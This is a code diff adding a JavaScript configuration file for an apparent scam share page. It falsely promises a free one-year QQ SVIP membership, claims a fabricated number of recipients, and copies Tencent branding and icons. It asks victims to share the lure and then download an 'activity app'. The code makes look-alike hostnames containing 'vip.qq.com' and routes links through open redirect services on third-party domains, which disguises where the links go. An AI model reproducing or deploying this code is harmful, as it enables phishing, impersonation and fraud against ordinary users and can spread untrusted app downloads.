@@ -1,0 +1,62 @@
+﻿var config_times='6';
+var sss=Math.ceil(Math.random()*9999);
+var timstamp = new Date().getTime();
+var qq = Math.random().toString(36).substr(2);
+var config_title='送你一年𝐒𝐕𝐈𝐏会员';
+var config_title1='送你一年𝐒𝐕𝐈𝐏会员';
+var config_image='http://t1.qpic.cn/mblogpic/46fdbb6be7ca14ae84cc/460';
+var config_description='已有368525人领取';
+var config_description1='已有368525人领取';
+var config_and_url='http://yangfanbook.sina.com.cn/image1/user/2023-12/ce376954-c79d-41e0-a3da-2b33b570cdc0.html?wo'+qq+'';
+var config_ios_url='http://yangfanbook.sina.com.cn/image1/user/2023-12/ce376954-c79d-41e0-a3da-2b33b570cdc0.html?wo';
+var config_finish='您已完成好运分享！\n最后一步，下载活动app(请选择→客户端本地下载) ，按提示完成新手任务即可自动到账！';
+var config_sourcename='𝐐𝐐超级会员';
+var config_shareelement='news';
+var config_shareqqtype='4';
+var config_iconUrl='https://midas.gtimg.cn/pay_admin/shvipgg_webpay.png';
+var config_action='';
+var config_actionData='';
+var config_puin='0';
+var copy = "##Y7hNnrznu##PAGE";
+var config_image1='http://t1.qpic.cn/mblogpic/46fdbb6be7ca14ae84cc/460';
+var config_sourcename1='QQ超级会员';
+var config_shareelement1='news';
+var config_shareqqtype1='4';
+var config_iconUrl1='https://midas.gtimg.cn/pay_admin/shvipgg_webpay.png';
+var config_action1='';
+var config_actionData1='';
+var config_puin1='0';
+function getRanNum(){
+       var result = [];
+        for(var i=0;i<4;i++){
+           var ranNum = Math.ceil(Math.random() * 25);
+            result.push(String.fromCharCode(97+ranNum));
+        }
+     return  result.join('');
+    }
+function getDomain(){
+	var url2 = [
+	''+getRanNum()+'vip.qq.com'+getRanNum()+'.bestshengqian.com/t/goto.aspx?&url=',
+	''+getRanNum()+'vip.qq.com'+getRanNum()+'.quanmama.com/t/goto.aspx?&url=',
+	''+getRanNum()+'vip.qq.com'+getRanNum()+'.daduoku.com/t/goto.aspx?&url=',
+	''+getRanNum()+'vip.qq.com'+getRanNum()+'.pddcoupon.com/t/goto.aspx?&url=',
+	''+getRanNum()+'vip.qq.com'+getRanNum()+'.juanlaoda.cn/t/goto.aspx?&url=',
+	''+getRanNum()+'vip.qq.com'+getRanNum()+'.quanmamaimg.com/t/goto.aspx?&url=',
+	''+getRanNum()+'vip.qq.com'+getRanNum()+'.quanmamaonline.com/t/goto.aspx?&url=',
+	''+getRanNum()+'vip.qq.com'+getRanNum()+'.quanmamaon.com/t/goto.aspx?&url=',
+	''+getRanNum()+'vip.qq.com'+getRanNum()+'.magic-unique.com/t/goto.aspx?&url=',
+	'q.url.cn/url/Jump?url=',
+	'so.toutiao.com/search/jump?url=',			
+	];
+	var i = parseInt(Math.random() * url2.length);
+	if(i == url2.length){
+		i = 0;
+	}
+	return url2[i];
+}
+var domain = getDomain();
+//var config_share='http://'+qq+'.youxi.vip.qq.com.mobile.iqyewu.cn:82/?&refer='+url+'%3f'+qq+'';
+//var config_share1='http://'+qq+'.youxi.vip.qq.com.mobile.iqyewu.cn:82/?&refer='+url+'%3f'+qq+'';
+var config_share='http://'+domain +''+url+'%3f'+qq+'x.k.qq.com';
+var config_share1='http://'+domain +''+url+'%3f'+qq+'x.k.qq.com';
+var config_share2='http://'+domain +''+url+'?'+qq+'x.k.qq.com';
